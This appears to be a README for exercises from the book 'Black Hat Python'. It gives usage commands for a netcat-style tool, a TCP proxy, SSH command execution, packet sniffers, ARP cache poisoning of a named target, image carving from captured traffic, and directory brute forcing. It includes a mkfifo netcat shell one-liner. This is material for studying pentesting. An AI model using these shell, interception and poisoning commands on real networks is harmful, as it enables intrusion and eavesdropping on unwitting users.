# bhp
Black Hat Python: Python Programming for Hackers and Pentesters

## BHP Net Tool
Replace netcat command with python.

### TCP client
* netcat command

		$ echo -ne "GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n" | nc www.google.com 80

* BHP Net Tool

		$ echo -ne "GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n" | python bhnet.py -t www.google.com -p 80

### Execute shell command
* netcat command

	*server side:*

		$ mkfifo /tmp/f
		$ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 5555 > /tmp/f

	*client side:*

		$ nc 127.0.0.1 5555
		ls -al

* BHP Net Tool

	*server side:*

		$ python bhnet.py -t 127.0.0.1 -p 5555 -l -c

	*client side:*

		$ python bhnet.py -t 127.0.0.1 -p 5555
		Ctrl-D
		<BHP:#> ls -al

	or more specifically ...

	*server side:*

		$ python bhnet.py -t 127.0.0.1 -p 5555 -l -e "ls -al"

	*client side:*

		$ python bhnet.py -t 127.0.0.1 -p 5555
		Ctrl-D


### Upload file
* netcat command

	*server side:*

		$ nc -l 127.0.0.1 5555 > /path/to/file

	*client side:*

		$ nc 127.0.0.1 5555 < /path/to/file

* BHP Net Tool

	*server side:*

		$ python bhnet.py -t 127.0.0.1 -p 5555 -l -u /path/to/file

	*client side:*

		$ python bhnet.py -t 127.0.0.1 -p 5555 < /path/to/file
		Ctrl-C

## TCP proxy
By execute following command, local machine comes into relaying the http connection.

	$ python proxy.py 127.0.0.1 5555 www.google.com 80 False

	$ echo -ne "GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n" | python bhnet.py -t 127.0.0.1 -p 5555
	HTTP/1.1 302 Found
	Cache-Control: private
	Content-Type: text/html; charset=UTF-8
	Location: http://www.google.co.jp/?gfe_rd=cr&ei=VWAUWKvaN-HC8geUn5XQCw
	Content-Length: 261
	Date: Sat, 29 Oct 2016 08:39:49 GMT

	<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
	<TITLE>302 Moved</TITLE></HEAD><BODY>
	<H1>302 Moved</H1>
	The document has moved
	<A HREF="http://www.google.co.jp/?gfe_rd=cr&amp;ei=VWAUWKvaN-HC8geUn5XQCw">here</A>.
	</BODY></HTML>

## SSH

### Execute shell command through ssh
After the ssh connection establishment, server send a command to client.
Then client execute a command and return result to server.

*server side:*

	$ python bh_sshserver.py 127.0.0.1 5555
	[+] Listening for connection ...
	[+] Got a connection!
	[+] Authenticated!
	ClientConnected
	Enter command: ls -la

*client side:*

	$ python bh_sshRcmd.py
	Welcome to bh_ssh

### Reverse SSH tunneling
For example, execute following command on local machine.

	$ python rforward.py sshserver:22 -p 5555 -r httpserver:80 --user username

Local machine becomes sshclient and establish *reverse ssh tunneling* to sshserver:22.
Then sshserver start listening to tcp 5555 port.
If httpclient connects to the sshserver:5555, the packet is forwarded to httpserver:80.

`httpserver` <---*tcp*---> `sshclient` <---*reverse ssh tunneling*---> `sshserver` <---*tcp*---> `httpclient`

The following ssh command is equivalent to the above.

	$ ssh -R 5555:httpserver:80 -p 22 username@sshserver

## RAW socket

### ICMP sniffer

* Display raw ip packet.

	*For example, following command captures the ICMP packets reached 192.168.0.14.*  
	*Note that icmp packet sent from 192.168.0.14 would not be captured.*

		$ sudo python sniffer.py 192.168.0.14
		Listen 192.168.0.14 ...
		0000   45 00 40 00 C0 DD 00 00 40 01 00 00 7F 00 00 01    E.@.....@.......
		0010   7F 00 00 01 00 00 30 AB 1E EC 00 16 58 14 3C B5    ......0.....X.<.
		0020   00 07 30 7F 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13    ..0.............
		0030   14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21 22 23    ............ !"#
		0040   24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32 33    $%&'()*+,-./0123
		0050   34 35 36 37

* Display ip packet's protocol, source, and destination.

		$ sudo python sniffer_ip_header_decode.py 192.168.0.14
		Listen 192.168.0.14 ...
		Protocol: ICMP 192.168.0.14 -> 192.168.0.14

* Display icmp packet's type and code.

		$ sudo python sniffer_with_icmp.py 192.168.0.14
		Listen 192.168.0.14 ...
		Protocol: ICMP 192.168.0.14 -> 192.168.0.14
		ICMP -> Type: 0 Code: 0

* Scan the all hosts in the subnet.

	*[netaddr](https://pythonhosted.org/netaddr/installation.html) are required.*  
	*For example, local machine's ip address is 192.168.0.14 and subnet is 192.168.0.0/24.*  
	*Following command sends UDP packet to all hosts in the subnet 192.168.0.0/24 and captures ICMP destination unreachable packet.*

		$ sudo python scanner.py 192.168.0.14 192.168.0.0/24
		Host Up: 192.168.0.1
		Host Up: 192.168.0.12

## Scapy

[Scapy](http://www.secdev.org/projects/scapy/) is a powerful interactive packet manipulation program.

Setup scapy.

* macOS

		$ python --version
		Python 2.7.12

		$ pip --version
		pip 8.1.2 from /opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages (python 2.7)
		
		$ sudo -H pip install scapy
		$ sudo port install py27-pcapy
		$ sudo port install py27-libdnet

* ubuntu

		$ python --version
		Python 2.7.12

		$ pip --version
		pip 8.1.2 from /home/panasonic/.local/lib/python2.7/site-packages (python 2.7)

		$ sudo -H pip install scapy
		$ sudo port install python-pcapy

	*Note that pcapy and dnet should be installed by macports.*  
	*If you install them by pip, then you might get following error.*

		  File "/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/scapy/arch/pcapdnet.py", line 390, in next
		s,us = h.getts()
		AttributeError: 'NoneType' object has no attribute 'getts'

### HTTP sniffer

Capture GET http requests.

	$ python http_sniffer.py

### ARP cache poisoning

For example, gateway is 192.168.0.1, attack target is 192.168.0.12.
By executing following command, the arp cache on gateway and target is poisoned and packets from target to gateway comes into passing through local machine. On local machine, following command captures 1000 packets of target and write to 'arper.pcap' file.

* macOS

	$ sudo sysctl -w net.inet.ip.forwarding=1
	$ python arper-jp.py -i en0 -t 192.168.0.12 -g 192.168.0.1 -c 1000

* ubuntu

	$ sudo sysctl -w net.ipv4.ip_forward=1
	$ python arper-jp.py -i en0 -t 192.168.0.12 -g 192.168.0.1 -c 1000

### pcap file processing

`pic_carver.py` extracts pictures from pcap file and detects face with the use of OpenCV.

Setup OpenCV.

* macOS

		$ sudo port install py27-numpy
		$ sudo port install py27-scipy
		$ sudo port install opencv
		$ sudo -H pip install opencv-python
		$ wget http://eclecti.cc/files/2008/03/haarcascade_frontalface_alt.xml

* ubuntu

		$ sudo apt-get install python-numpy
		$ sudo apt-get install python-scipy
		$ sudo apt-get install libopencv-dev python-opencv
		$ sudo -H pip install opencv-python
		$ wget http://eclecti.cc/files/2008/03/haarcascade_frontalface_alt.xml

Execute following command.
Specify the pcap file made by `arper-jp.py` to `pcap_file`.
Specify the MAC address of machine you run `arper-jp.py` to `mac_addr`.

	$ python pic_carver.py pcap_file mac_addr

## Attack a web server

### Brute force directories and files

Target is testphp.vulnweb.com.

Dictionary for brute force is DirBuster-Lists.tar.bz2.

	$ python content_bruter.py

## Appendix

* How to set an HTTP proxy in Python 2.7?

		>set HTTP_PROXY=http://proxy.com:port
		>set HTTPS_PROXY=https://proxy.com:port
		>pip install netaddr

